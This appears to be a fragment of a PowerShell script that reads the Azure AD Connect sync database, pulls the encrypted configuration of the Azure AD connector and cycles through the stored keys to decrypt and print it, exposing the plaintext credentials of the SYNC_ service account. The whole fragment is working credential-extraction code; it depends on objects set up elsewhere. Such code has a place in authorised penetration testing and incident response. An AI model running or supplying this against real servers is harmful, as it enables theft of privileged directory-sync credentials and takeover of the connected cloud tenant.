Write-Host "=== SYNC_xxx Account (Azure AD Connector - DEBUG) ==="

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'Extensible2'"
$reader = $cmd.ExecuteReader()

if ($reader.Read()) {
    $config_azure = $reader.GetString(0)
    $crypted_azure = $reader.GetString(1)
    $reader.Close()
    
    Write-Host "Config XML:"
    Write-Host $config_azure
    Write-Host "`nEncrypted data (first 100 chars):"
    Write-Host $crypted_azure.Substring(0, [Math]::Min(100, $crypted_azure.Length))
    
    # Try all available keys
    for ($i = 0; $i -lt 5; $i++) {
        try {
            $key = $null
            $km.GetKey($i, [ref]$key)
            
            if ($key -ne $null) {
                Write-Host "`n=== Key $i found ===" 
                $decrypted = $null
                $key.DecryptBase64ToString($crypted_azure, [ref]$decrypted)
                Write-Host "Decrypted successfully:"
                Write-Host $decrypted
                break
            }
            else {
                Write-Host "Key $i is null"
            }
        }
        catch {
            Write-Host "Key $i error: $($_.Exception.Message)"
        }
    }
}
else {
    Write-Host "No Extensible2 found"
    $reader.Close()
}
